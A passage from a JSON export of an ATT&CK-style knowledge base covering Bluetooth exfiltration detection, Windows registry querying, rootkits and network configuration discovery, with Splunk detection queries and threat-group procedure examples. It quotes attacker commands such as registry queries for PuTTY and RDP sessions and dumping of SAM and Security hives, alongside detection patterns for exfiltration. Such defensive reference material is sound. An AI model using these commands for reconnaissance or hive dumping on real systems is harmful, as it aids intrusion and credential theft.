      "Monitor file access events in directories commonly used for data staging (/tmp, C:\\Users\\Public), files copied to Bluetooth shared folders, or high-volume file reads or writes before network activity.Analytic 1 - Detecting File Access Before Bluetooth Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/var/tmp/\", \"/home//Downloads/\", \"/media/bluetooth/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path IN (\"/media/bluetooth/\"), 9,    file_path IN (\"/var/tmp/*\"), 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for unusual Bluetooth device pairings, inbound or outbound Bluetooth connections from unexpected processes, or unexpected activation of Bluetooth Personal Area Network (PAN) services.Analytic 1 - Detecting Unauthorized Bluetooth Network Connections(EventCode=3 OR EventCode=10400)OR (source=\"zeek_conn.log\" interface IN (\"bt0\"))| eval risk_score=case(    interface IN (\"bt0\"), 9,    process_name IN (\"bluetoothctl\", \"bttransfer\"), 8)| where risk_score >= 8| stats count by _time, host, user, interface, dest_device, risk_score",
      "Monitor high-volume data transfers over Bluetooth, Bluetooth PAN being used to route exfiltrated data, or Unusual Bluetooth protocol usage on enterprise endpoints.Analytic 1 - Detecting Large Data Exfiltration via Bluetooth(EventCode=3)OR (source=\"zeek_conn.log\" protocol=\"bluetooth\" bytes_out > 5000000)OR (source=\"firewall_logs\" protocol=\"bluetooth\" bytes_out > 10000000)| eval risk_score=case(    bytes_out > 10000000, 9,    bytes_out > 5000000, 8)| where risk_score >= 8| stats count by _time, host, user, dest_device, bytes_out, risk_score",
      "Monitor network data for uncommon data flows., such as the usage of abnormal/unexpected protocols."
    ],
    "Procedure Examples": [
      "Flamehas a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.[1]"
    ]
  },
  "T1012": {
    "Name": "Query Registry",
    "Description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.[1]Information can easily be queried using theRegutility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information fromQuery Registryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Detects": [
      "Monitor executed commands and arguments for actions that may interact with the Windows Registry to gather information about the system, configuration, and installed software.Note: For PowerShell Module logging event id 4103, enable logging for module Microsoft.PowerShell.Management. The New-PSDrive PowerShell cmdlet creates temporary and persistent drives that are mapped to or associated with a location in a data store, such a registry key (PSProvider \"Registry\"). The the Get-ChildItem gets the items in one or more specified locations. By using both, you can enumerate COM objects in one or more specified locations.Analytic 1 - Suspicious Commands(sourcetype=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" EventCode=\"4103\") | WHERE CommandLine LIKE \"%New-PSDrive%\" AND (CommandLine LIKE \"%Registry%\" OR CommandLine LIKE \"%HKEY_CLASSES_ROOT%\" OR CommandLine LIKE \"%HKCR%\")",
      "Monitor for API calls (such asRegOpenKeyExA) that may interact with the Windows Registry to gather information about the system, configuration, and installed software. OS API calls associated with querying the Windows Registry are RegOpenKeyEx , RegOpenUserClassesRoot, RegQueryValueExA, and RegQueryValueExW. Execution of these functions might trigger security log ids such as 4663 (Microsoft Security Auditing). Also monitor for RegOpenUserClassesRoot api to retrieve a handle to the HKEY_CLASSES_ROOT key for a specified user. The returned key has a view of the registry that merges the contents of the HKEY_LOCAL_MACHINE\\Software\\Classes key with the contents of the Software\\Classes keys in the user's registry hive.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls.",
      "Monitor for newly executed processes that may interact with the Windows Registry to gather information about the system, configuration, and installed software.Note: The New-PSDrive PowerShell cmdlet creates temporary and persistent drives that are mapped to or associated with a location in a data store, such a registry key (PSProvider \"Registry\"). The Get-ChildItem gets the items in one or more specified locations. By using both, you can enumerate COM objects in one or more specified locations.Note for Analytic 3: Replace FilePathToLolbasProcessXX.exe with lolBAS process names that are used by your organization. The number_standard_deviations parameter should be tuned accordingly. Identifying outliers by comparing distance from a data point to the average value against a certain number of standard deviations is recommended for data values that are symmetrical distributed. If your data is not distributed, try a different algorithm such as the Interquartile Range (IQR).Analytic 1 - Suspicious Processes with Registry keys(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") | search (CommandLine LIKE \"%reg%\" AND CommandLine LIKE \"%query%\") OR (CommandLine LIKE \"%Registry%\" AND (CommandLine LIKE \"%HKEY_CLASSES_ROOT%\" OR CommandLine \"%HKCR%\"))Analytic 2 - reg.exe spawned from suspicious cmd.exe((sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") | WHERE (Image LIKE \"%reg.exe%\" AND ParentImage LIKE \"%cmd.exe%\")| rename ProcessParentGuid as guid| join type=inner guid[ | search ((source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND (Image LIKE \"%cmd.exe%\" AND ParentImage NOT LIKE \"%explorer.exe%\")| rename ProcessGuid as guid ]Analytic 3 - Rare LolBAS command lines((sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND Image IN ('FilePathToLolbasProcess01.exe','FilePathToLolbasProcess02.exe') AND number_standard_deviations = 1.5| select Image, ProcessCount, AVG(ProcessCount) Over() - STDEV(ProcessCount) Over() * number_standard_deviations AS LowerBound | WHERE ProcessCount < LowerBound",
      "Monitor for unexpected process interactions with the Windows Registry (i.e. reads) that may be related to gathering information.Note: For Security Auditing event ids 4656 and 4663, a System Access Control List (SACL) that controls the use of specific access rights such as Enumerate sub-keys and Query key value is required for event generation. Depending on the Registry key you are monitoring, the implementation of a new System Access Control List (SACL) might be required. Depending of Registry key used for the creation of a System Access Control List (SACL), the generation of event ids 4656 and 4663 might be noisy.Analytic 1 - Suspicious Registry(sourcetype=\"WinEventLog:Security\" EventCode IN (4663, 4656)) AND ObjectType=\"Key\" | WHERE ObjectName LIKE \"%SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall%\" AND (UserAccessList LIKE \"%4435%\" OR UserAccessList LIKE \"%Enumerate sub-keys%\" OR UserAccessList LIKE \"%4432%\" OR UserAccessList LIKE \"%Query key value%\") AND Image NOT IN ('FilePathToExpectedProcess01.exe','FilePathToExpectedProcess02.exe')"
    ],
    "Procedure Examples": [
      "ADVSTORESHELLcan enumerate registry keys.[2][3]",
      "APT32's backdoor can query the Windows Registry to gather system information.[4]",
      "APT39has used various strains of malware to query the Registry.[5]",
      "APT41queried registry values to determine items such as configured RDP ports and network configurations.[6]",
      "Attorhas opened the registry and performed query searches.[7]",
      "Azorultcan check for installed software on the system under the Registry keySoftware\\Microsoft\\Windows\\CurrentVersion\\Uninstall.[8]",
      "BabySharkhas executed thereg querycommand forHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.[9]",
      "BACKSPACEis capable of enumerating and making modifications to an infected system's Registry.[10]",
      "Bankshotsearches for certain Registry keys to be configured before executing the payload.[11]",
      "Bazarcan queryWindows\\CurrentVersion\\Uninstallfor installed applications.[12][13]",
      "BendyBearcan query the host's Registry key atHKEY_CURRENT_USER\\Console\\QuickEditto retrieve data.[14]",
      "Bisonalhas used the RegQueryValueExA function to retrieve proxy information in the Registry.[15]",
      "BitPaymercan use the RegEnumKeyW to iterate through Registry keys.[16]",
      "BlackBytequeried registry values to determine system language settings.[17]",
      "BlackByte Ransomwareenumerates the Registry, specifically theHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Optionskey.[18]",
      "Brave Princegathers information about the Registry.[19]",
      "Bumblebeecan check the Registry for specific keys.[20]",
      "Carbanakchecks the Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settingsfor proxy configurations information.[21]",
      "Carberphas searched the Image File Execution Options registry key for \"Debugger\" within every subkey.[22]",
      "Carbonenumerates values in the Registry.[23]",
      "Cardinal RATcontains watchdog functionality that periodically ensuresHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Loadis set to point to its executable.[24]",
      "CharmPowerhas the ability to enumerateUninstallregistry values.[25]",
      "Chimerahas queried Registry keys usingreg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Serversandreg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.[26]",
      "CHOPSTICKprovides access to the Windows Registry, which can be used to gather information.[27]",
      "Clamblinghas the ability to enumerate Registry keys, includingKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDirto search for a bitcoin wallet.[28][29]",
      "Cobalt Strikecan queryHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\to determine if the security setting for restricting default programmatic access is enabled.[30][31]",
      "ComRATcan check the default browser by queryingHKCR\\http\\shell\\open\\command.[32]",
      "Crimsoncan check the Registry for the presence ofHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edateto determine how long it has been installed on a host.[33]",
      "DaggerflyusedRegto dump the Security Account Manager (SAM), System, and Security Windows registry hives from victim machines.[34]",
      "DarkWatchmancan query the Registry to determine if it has already been installed on the system.[35]",
      "Denisqueries the Registry for keys and values.[36]",
      "Derusbiis capable of enumerating Registry keys and values.[37]",
      "DownPapersearches and reads the value of the Windows Update Registry Run key.[38]",
      "Dragonflyhas queried the Registry to identify victim information.[39]",
      "Dtrackcan collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.[40]",
      "DUSTTRAPcan enumerate Registry items.[41]",
      "Epicuses therem reg querycommand to obtain values from Registry keys.[42]",
      "FatDukecan get user agent strings for the default browser fromHKCU\\Software\\Classes\\http\\shell\\open\\command.[43]",
      "FELIXROOTqueries the Registry for specific keys for potential privilege escalation and proxy information.FELIXROOThas also used WMI to query the Windows Registry.[44][45]",
      "FinFisherqueries Registry values as part of its anti-sandbox checks.[46][47]",
      "Fox Kittenhas accessed Registry hives ntuser.dat and UserClass.dat.[48]",
      "FunnyDreamcan checkSoftware\\Microsoft\\Windows\\CurrentVersion\\Internet Settingsto extract theProxyServerstring.[49]",
      "Gelsemiumcan open random files and Registry keys to obscure malware behavior from sandbox analysis.[50]",
      "gh0st RAThas checked for the existence of a Service key to determine if it has already been installed on the system.[51]",
      "Gold Dragonenumerates registry keys with the commandregkeyenumand obtains information for the Registry keyHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[19]",
      "A variant ofHOPLIGHThooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the keySYSTEM\\CurrentControlSet\\Control\\Lsa Name.[52]",
      "Hydraqcreates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.[53][54]",
      "Indrik Spiderhas used a service account to extract copies of theSecurityRegistry hive.[55]",
      "Industroyerhas a data wiper component that enumerates keys in the RegistryHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.[56]",
      "InvisiMolecan enumerate Registry values, keys, and data.[57]",
      "JPINcan enumerate Registry keys.[58]",
      "Kapekaqueries registry values for stored configuration information.[59]",
      "Kimsukyhas obtained specific Registry keys and values on a compromised host.[60]",
      "Lazarus Groupmalware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. AnotherLazarus Groupmalware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.[61][62][63]",
      "LiteDukecan query the Registry to check for the presence ofHKCU\\Software\\KasperskyLab.[43]",
      "LitePowercan query the Registry for keys added to execute COM hijacking.[64]",
      "Lotus Blossomhas run commands such asreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\[service name]\\Parametersto verify if installed implants are running as a service.[65]",
      "Lucifercan check for existing stratum cryptomining information inHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%.[66]",
      "Mafaldacan enumerate Registry keys with all subkeys and values.[67]",
      "Milancan queryHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuidto retrieve the machine GUID.[68]",
      "Morican read data from the Registry including fromHKLM\\Software\\NFC\\IPAandHKLM\\Software\\NFC\\.[69]",
      "njRATcan read specific registry values.[70]",
      "OilRighas usedreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"on a victim to query the Registry.[71]",
      "DuringOperation Wocao, the threat actors executed/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\to detect recent PuTTY sessions, likely to further lateral movement.[72]",
      "OSInfoqueries the registry to look for information about Terminal Services.[73]",
      "PcSharecan search the registry files of a compromised host.[49]",
      "Pillowminthas used shellcode which reads code stored in the registry keys\\REGISTRY\\SOFTWARE\\Microsoft\\DRMusing the native Windows API as well as readHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfacesas part of its C2.[74]",
      "PlugXcan enumerate and query for information contained within the Windows Registry.[75][76]",
      "POWERSOURCEqueries Registry keys in preparation for setting Run keys to achieve persistence.[77]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.[78][79]",
      "POWRUNERmay query the Registry by runningreg queryon a victim.[80]",
      "Proxysvcgathers product names from the Registry key:HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductNameand the processor description from the Registry keyHKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.[81]",
      "QUADAGENTchecks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.[82]",
      "QUIETCANARYhas the ability to retrieve information from the Registry.[83]",
      "Raccoon Stealerqueries the Windows Registry to fingerprint the infected host via theHKLM:\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuidkey.[84][85]",
      "RATANKBAuses the commandreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\".[86]",
      "Reaverqueries the Registry to determine the correct Startup path to use for persistence.[87]",
      "Regmay be used to gather details from the Windows Registry of a local or remote system at the command-line interface.[88]",
      "REvilcan query the Registry to get random file extensions to append to encrypted files.[89]",
      "Rising Sunhas identified the OS product name from a compromised host by searching the registry forSOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName.[90]",
      "ROKRATcan access theHKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosDataRegistry key to obtain the System manufacturer value to identify the machine type.[91]",
      "Saint Bothas usedcheck_registry_keysas part of its environmental checks.[92]",
      "Samuraican querySOFTWARE\\Microsoft\\.NETFramework\\policy\\v2.0for discovery.[93]",
      "Shamoonqueries several Registry keys to identify hard disk partitions to overwrite.[94]",
      "Sharkcan queryHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuidto retrieve the machine GUID.[68]",
      "Sibothas queried the registry for proxy server information.[95]",
      "SILENTTRINITYcan use theGetRegValuefunction to check Registry keys withinHKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedandHKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.[96]",
      "SodaMasterhas the ability to query the Registry to detect a key specific to VMware.[97]",
      "Stealth Falconmalware attempts to determine the installed version of .NET by querying the Registry.[98]",
      "StoneDrillhas looked in the registry to find the default browser path.[99]",
      "Stuxnetsearches the Registry for indicators of security programs.[100]",
      "SUNBURSTcollected the registry valueHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuidfrom compromised hosts.[101]",
      "SVCReadycan search for theHKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SystemRegistry key to gather system information.[102]",
      "SynAckenumerates Registry keys associated with event logs.[103]",
      "Taidoorcan query the Registry on compromised hosts usingRegQueryValueExA.[104]",
      "TEARDROPchecked thatHKU\\SOFTWARE\\Microsoft\\CTFexisted before decoding its embedded payload.[101][105]",
      "AThreat Group-3390tool can read and decrypt stored Registry values.[106]",
      "TinyTurlacan query the Registry for its configuration information.[107]",
      "TRANSLATEXThas queried the following registry key to check for installed Chrome extensions:HKCU\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist.[108]",
      "Turlasurveys a system upon check-in to discover information in the Windows Registry with thereg querycommand.[42]Turlahas also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .[109]",
      "Uroburoscan query the Registry, typicallyHKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, to find the key and path to decrypt and load its kernel driver and kernel driver loader.[110]",
      "Ursnifhas usedRegto query the Registry for installed programs.[111][112]",
      "Valakcan use the Registry for code updates and to collect credentials.[113]",
      "Volgmerchecks the system for certain Registry keys.[114]",
      "Volt Typhoonhas queried the Registry on compromised systems,reg query hklm\\software\\, for information on installed software including PuTTY.[115][116]",
      "WastedLockerchecks for specific registry keys related to theUCOMIEnumConnectionsandIActiveScriptParseProcedure32interfaces.[117]",
      "Waterbearcan query the Registry key\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\"to see if the valueOracleOcilibexists.[118]",
      "WINDSHIELDcan gather Registry values.[119]",
      "Woody RATcan search registry keys to identify antivirus programs on an compromised host.[120]",
      "Zebrocyexecutes thereg querycommand to obtain information in the Registry.[121]",
      "Zeus Pandachecks for the existence of a Registry key and if it contains certain values.[122]",
      "ZIRCONIUMhas used a tool to query the Registry for proxy settings.[123]",
      "ZxShellcan query the netsvc group value data located in the svchost group Registry key.[124]",
      "ZxxZcan search the registry of a compromised host.[125]"
    ]
  },
  "T1014": {
    "Name": "Rootkit",
    "Description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.[1]Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, orSystem Firmware.[2]Rootkits have been seen for Windows, Linux, and Mac OS X systems.[3][4]",
    "Detects": [
      "Monitor for changes made to drive letters or mount points of data storage devices for unexpected modifications that may be used by rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components.",
      "Monitor for changes and the existence of unrecognized DLLs, drivers, devices, services, and to the MBR.[2]",
      "Monitor for changes made to firmware for unexpected modifications to settings and/or data that may be used by rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior."
    ],
    "Procedure Examples": [
      "APT28has used a UEFI (Unified Extensible Firmware Interface) rootkit known asLoJax.[5][6]",
      "APT41deployed rootkits on Linux systems.[7][8]",
      "ArcaneDoorincluded hooking theprocessHostScanReply()function on victim Cisco ASA devices.[9]",
      "Carberphas used user mode rootkit techniques to remain hidden on the system.[10]",
      "Caterpillar WebShellhas a module to use a rootkit on a system.[11]",
      "COATHANGERhooks or replaces multiple legitimate processes and other functions on victim devices.[12]",
      "Drovorubhas used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.[13]",
      "Eburyacts as a user land rootkit using the SSH service.[14][15]",
      "Hacking Team UEFI Rootkitis a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[16]",
      "HiddenWaspuses a rootkit to hook and implement functions on the system.[17]",
      "HIDEDRVis a rootkit that hides certain operating system artifacts.[18]",
      "Hikitis aRootkitthat has been used byAxiom.[19][20]",
      "Hildegardhas modified /etc/ld.so.preload to overwrite readdir() and readdir64().[21]",
      "HTRANcan install a rootkit to hide network connections from the host OS.[22]",
      "Line Dancercan hook both the crash dump process and the Autehntication, Authorization, and Accounting (AAA) functions on compromised machines to evade forensic analysis and authentication mechanisms.[9]",
      "LoJaxis a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.[6]",
      "PoisonIvystarts a rootkit from a malicious file dropped to disk.[23]",
      "Ramsayhas included a rootkit to evade defenses.[24]",
      "Rockehas modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[25]",
      "Skidmapis a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.[26]",
      "Stuxnetuses a Windows rootkit to mask its binaries and other relevant files.[27]",
      "TeamTNThas used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.[28][29]",
      "Umbreonhides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.[30]",
      "Uroburoscan use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.[31][32]",
      "WarzoneRATcan include a rootkit to hide processes, files, and startup.[33]",
      "Winnti for Linuxhas used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.[34]",
      "Winnti Groupused a rootkit to modify typical server functionality.[35]",
      "Zeroaccessis a kernel-mode rootkit.[36]"
    ]
  },
  "T1016": {
    "Name": "System Network Configuration Discovery",
    "Description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples includeArp,ipconfig/ifconfig,nbtstat, androute.Adversaries may also leverage aNetwork Device CLIon network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g.show ip route,show ip interface).[1][2]On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the commandesxcli network nic listwill retrieve the MAC address, whileesxcli network ip interface ipv4 getwill retrieve the local IPv4 address.[3]Adversaries may use the information fromSystem Network Configuration Discoveryduring automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "Detects": [
      "Monitor executed commands and arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.",
      "Monitor for API calls (such asGetAdaptersInfo()andGetIpNetTable()) that may gather details about the network configuration and settings, such as IP and/or MAC addresses.",
      "Monitor for executed processes (such as ipconfig/ifconfig and arp) with arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses.Note: The Analytic looks for the creation ofipconfig,route, andnbtstatprocesses, all of which are system administration utilities that can be used for the purpose of system network configuration discovery. If these tools are commonly used in your environment (e.g., by system administrators) this may lead to false positives and this analytic will therefore require tuning.Analytic 1 - Suspicious Process(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND  (Image=\"C:\\Windows\\System32\\ipconfig.exe\" OR   Image=\"C:\\Windows\\System32\\route.exe\" OR   Image=\"C:\\Windows\\System32\\nbtstat.exe\")",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "Action RAThas the ability to collect the MAC address of an infected host.[4]",
      "AdFindcan extract subnet information from Active Directory.[5][6][7]",
      "admin@338actors used the following command after exploiting a machine withLOWBALLmalware to acquire information about local networks:ipconfig /all >> %temp%\\download[8]",
      "Agent Teslacan collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.[9][10]",
      "Agent.btzcollects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.[11]",
      "Amadeycan identify the IP address of a victim machine.[12]",
      "Anchorcan determine the public IP and location of a compromised host.[13]",
      "AppleSeedcan identify the IP of a targeted system.[14]",
      "APT1used theipconfig /allcommand to gather network configuration information.[15]",
      "APT19used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.[16]",
      "A keylogging tool used byAPT3gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[17][18]",
      "APT32used theipconfig /allcommand to gather the IP address from the system.[19]",
      "APT41collected MAC addresses from victim machines.[20][21]",
      "APT42has used malware, such as GHAMBAR and POWERPOST, to collect network information.[22]",
      "Aria-bodyhas the ability to identify the location, public IP address, and domain name on a compromised host.[23]",
      "Arpcan be used to display ARP configuration information on the host.[24]",
      "Astarothcollects the external IP address from the system.[25]",
      "Avaddoncan collect the external IP address of the victim.[26]",
      "Avengercan identify the domain of the compromised host.[27]",
      "Azorultcan collect host IP information from the victim’s machine.[28]",
      "BabySharkhas executed theipconfig /allcommand.[29]",
      "Backdoor.Oldreacollects information about the Internet adapter configuration.[30][31]",
      "BADCALLcollects the network adapter information.[32]",
      "BADFLICKhas captured victim IP address details.[33]",
      "Bandookhas a command to get the public IP address from a system.[34]",
      "Bazarcan collect the IP address and NetBIOS name of an infected machine.[35]",
      "Bisonalcan executeipconfigon the victim’s machine.[36][37][38]",
      "BlackByteused tools such asArpto pull system network information and identify connected devices.[39][40]",
      "BlackEnergyhas gathered information about network IP configurations usingipconfig.exe and about routing tables usingroute.exe.[41][42]",
      "BLINDINGCANhas collected the victim machine's local IP address information and MAC address.[43]",
      "BLUELIGHTcan collect IP information from the victim’s machine.[44]",
      "BOLDMOVEenumerates network interfaces on the infected host.[45]",
      "Bonadancan find the external IP address of the infected host.[46]",
      "BoxCaoncan collect the victim's MAC address by using theGetAdaptersInfoAPI.[47]",
      "Brave Princegathers network configuration information as well as the ARP cache.[48]",
      "DuringC0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.[49]",
      "DuringC0017,APT41usedcmd.exe /c ping %userdomain%for discovery.[50]",
      "DuringC0018, the threat actors rannslookupand Advanced IP Scanner on the target network.[51]",
      "Calistoruns theifconfigcommand to obtain the IP address from the victim’s machine.[52]",
      "Carboncan collect the IP address of the victims and other computers on the network using the commands:ipconfig -allnbtstat -n, andnbtstat -s.[53][54]",
      "Catchamasgathers the Mac address, IP address, and the network adapter information from the victim’s machine.[55]",
      "Caterpillar WebShellcan gather the IP address from the victim's machine using the IP config command.[56]",
      "cd00rcan discover the IP for the network interface on the compromised device.[57]",
      "CharmPowerhas the ability to useipconfigto enumerate system network settings.[58]",
      "Chimerahas usedipconfig,Ping, andtracertto enumerate the IP address and network environment and settings of the local host.[59]",
      "Chrommmecan enumerate the IP address of a compromised host.[60]",
      "Clamblingcan enumerate the IP address of a compromised machine.[61][62]",
      "Cobalt Strikecan determine the NetBios name and  the IP addresses of targets machines including domain controllers.[63][64]",
      "Comnieusesipconfig /allandroute PRINTto identify network adapter and interface information.[65]",
      "Contican retrieve the ARP cache from the local system by using theGetIpNetTable()API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.[66]",
      "CrackMapExeccan collect DNS information from the targeted system.[67]",
      "CreepySnailcan usegetmacandGet-NetIPAddressto enumerate network settings.[68]",
      "Crimsoncontains a command to collect the victim MAC address and LAN IP.[69][70]",
      "Cubacan retrieve the ARP cache from the local system by usingGetIpNetTable.[71]",
      "Cyclops Blinkcan use the Linux APIif_nameindexto gather network interface names.[72][73]",
      "Darkhotelhas collected the IP address and network adapter information from the victim’s machine.[74][75]",
      "DEADEYEcan discover the DNS domain name of a targeted system.[50]",
      "Denisusesipconfigto gather the IP address from the system.[19]",
      "Diavolcan enumerate victims' local and external IPs when registering with C2.[76]",
      "down_newhas the ability to identify the MAC address of a compromised host.[27]",
      "Dragonflyhas used batch scripts to enumerate network information, including information about trusts, zones, and the domain.[77]",
      "Dtrackcan collect the host's IP addresses using theipconfigcommand.[78][79]",
      "The reconnaissance modules used withDuqucan collect information on network configuration.[80]",
      "DUSTTRAPcan enumerate infected system network information.[81]",
      "Dyrehas the ability to identify network settings on a compromised host.[82]",
      "Earth Luscaused the commandipconfigto obtain information about network configurations.[83]",
      "EKANScan determine the domain of a compromised host.[84]",
      "Eliseexecutesipconfig /allafter initial communication is made to the remote server.[85][86]",
      "Emissaryhas the capability to execute the commandipconfig /all.[87]",
      "Empirecan acquire network configuration information like DNS servers, public IP, and network proxies used by a host.[88][89]",
      "Epicuses thenbtstat -nandnbtstat -scommands on the victim’s machine.[90]",
      "Explosivehas collected the MAC address from the victim's machine.[91]",
      "FALLCHILLcollects MAC address and local IP address information from the victim.[92]",
      "FatDukecan identify the MAC address on the target computer.[93]",
      "Felismuscollects the victim LAN IP address and sends it to the C2 server.[94]",
      "FELIXROOTcollects information about the network including the IP address and DHCP server.[95]",
      "FIN13has usednslookupandipconfigfor network reconnaissance efforts.FIN13has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.[96][97]",
      "Flagprohas been used to execute theipconfig /allcommand on a victim system.[98]",
      "DuringFrankenstein, the threat actors usedEmpireto find the public IP address of a compromised system.[89]",
      "FunnyDreamcan parse theProxyServerstring in the Registry to discover http proxies.[99]",
      "DuringFunnyDream, the threat actors usedipconfigfor discovery on remote systems.[99]",
      "GALLIUMusedipconfig /allto obtain information about the victim network configuration. The group also ran a modified version ofNBTscanto identify available NetBIOS name servers.[100]",
